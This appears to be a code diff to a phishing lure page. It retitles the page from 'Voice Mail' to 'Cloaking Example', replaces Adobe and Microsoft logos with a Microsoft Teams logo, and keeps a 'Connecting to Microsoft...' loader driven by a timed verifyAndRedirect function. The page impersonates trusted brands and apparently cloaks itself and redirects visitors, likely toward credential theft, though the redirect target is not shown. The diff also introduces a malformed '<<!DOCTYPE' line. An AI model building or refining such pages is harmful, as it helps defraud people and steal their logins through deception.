@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voice Mail</title>
+    <title>Cloaking Example</title>
     <style>
         body, html {
             margin: 0;
@@ -409,7 +409,7 @@ function verifyAndRedirect() {
             setTimeout(verifyAndRedirect, 1000);
         `;
         document.getElementById('content').innerHTML = `
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -452,14 +452,9 @@ function verifyAndRedirect() {
         }
 
         .feds-brand-image img {
-            width: 50px; /* Smaller size for the Adobe logo */
+            width: 100px; /* Increased size for the Microsoft Teams logo */
             height: auto;
-            margin-right: 20px; /* More space between logos */
-        }
-
-        .logo {
-            width: 90px; /* Larger size for Microsoft logo */
-            height: auto;
+            margin-right: 20px; /* More space if you were to add another logo */
         }
 
         .loader {
@@ -523,10 +518,11 @@ function verifyAndRedirect() {
         <div class="logos">
             <a href="https://www.adobe.com/" class="feds-brand" daa-ll="Brand">
                 <span class="feds-brand-image">
-                    <img loading="lazy" src="https://www.adobe.com/federal/assets/svgs/adobe-logo.svg" alt="Adobe, Inc.">
+                    <!-- Updated image source for Microsoft Teams logo -->
+                    <img loading="lazy" src="https://thinkadnet.com/wp-content/uploads/2020/08/Microsoft-Teams-as-a-Phone-System-1.png" alt="Microsoft Teams">
                 </span>
             </a>
-            <img class="logo" src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg" role="img" alt="Microsoft">
+            <!-- Removed second logo -->
         </div>
         <div class="loader"></div>
         <p class="connecting-message">Connecting to Microsoft...</p>
@@ -538,6 +534,7 @@ function verifyAndRedirect() {
     </div>
 </body>
 </html>
+
 
     `;
         document.body.appendChild(script);
